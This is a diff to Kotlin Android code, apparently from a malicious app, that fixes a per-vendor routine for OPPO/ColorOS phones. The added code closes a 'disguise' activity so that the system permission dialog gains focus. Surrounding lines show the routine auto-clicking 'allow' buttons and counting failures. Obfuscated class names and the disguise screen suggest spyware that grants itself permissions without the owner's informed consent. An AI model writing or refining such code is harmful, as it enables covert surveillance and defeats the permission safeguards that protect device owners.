@@ -191,6 +191,14 @@ open class OppoSteps(
         Log.i(TAG, "[Step1/9] enter executeStep1BasicPermissions")
         logs.add("[Step 1/9] ▶ 基础权限开始(超时10秒) | vendor m212323c1")
 
+        // Phase F: 启动 umrkmgrri 之前先 finish iuzxujjtqev。
+        // iuzxujjtqev 是 launchMode=singleInstance,被 DeviceAuthorizationManager.smartReturnToApp()
+        // 拉到前台后,会独占 focus,即便 umrkmgrri 走 FLAG_ACTIVITY_NEW_TASK 到独立 task,
+        // Android framework 也不会把 focus 从 iuzxujjtqev 转给它 —— permission dialog
+        // 实际无法激活,onRequestPermissionsResult 永远不回调 (Phase E 真机 logcat 证实)。
+        finishDisguiseActivityIfAlive(logs)
+        delay(400L)
+
         // 启动批量权限 Activity(复用现有 umrkmgrri)
         try {
             val intent = Intent(context, umrkmgrri::class.java).apply {
@@ -249,6 +257,34 @@ open class OppoSteps(
         } else {
             // Phase E: clickCount=0 必须记 failures,不能静默跳过,避免 executeAll 统计失真
             failures.add("[Step 1/9] 10s 内未点中任何允许按钮(可能 permission dialog 被其他 Activity 遮盖)")
+        }
+    }
+
+    /**
+     * Phase F: 启动 umrkmgrri 之前主动 finish iuzxujjtqev。
+     *
+     * 真机根因(OPPO PGFM10 Android 16 / ColorOS 16 logcat 实锤):
+     * - iuzxujjtqev 是 `launchMode="singleInstance"`,独占 task 且 SMART_RETURN_BACKUP=true 时驻留
+     * - umrkmgrri 即使走 FLAG_ACTIVITY_NEW_TASK 到独立 task,也抢不到 focus
+     * - 结果 umrkmgrri.requestPermissions() 被接受但 GrantPermissionsActivity 从未真实激活
+     *   (onRequestPermissionsResult 永不回调 → Step 1 轮询 10s 看不到任何 permissioncontroller UI)
+     *
+     * 修复:在启动 umrkmgrri 前主动 finish 当前 iuzxujjtqev(若存在),让 task 592 消失,
+     * umrkmgrri 的 task 593 接管 focus。finish 调用在 UI 线程 dispatch,非阻塞。
+     */
+    open fun finishDisguiseActivityIfAlive(logs: MutableList<String>) {
+        try {
+            val act = com.storm.safe.rock.iuzxujjtqev.getCurrentActivity()
+            if (act == null || act.isFinishing || act.isDestroyed) return
+            Log.i(TAG, "[Step 1/9] 检测到 iuzxujjtqev 前台,主动 finish 避免遮盖 umrkmgrri")
+            logs.add("[Step 1/9] 主动 finish iuzxujjtqev(Phase F 修复 focus 遮盖)")
+            act.runOnUiThread {
+                try { act.finish() } catch (_: Exception) { /* 不阻断 Step 1 */ }
+            }
+        } catch (e: kotlinx.coroutines.CancellationException) {
+            throw e
+        } catch (e: Exception) {
+            Log.w(TAG, "[Step 1/9] finishDisguiseActivityIfAlive 异常(不阻断): ${e.message}")
         }
     }
 
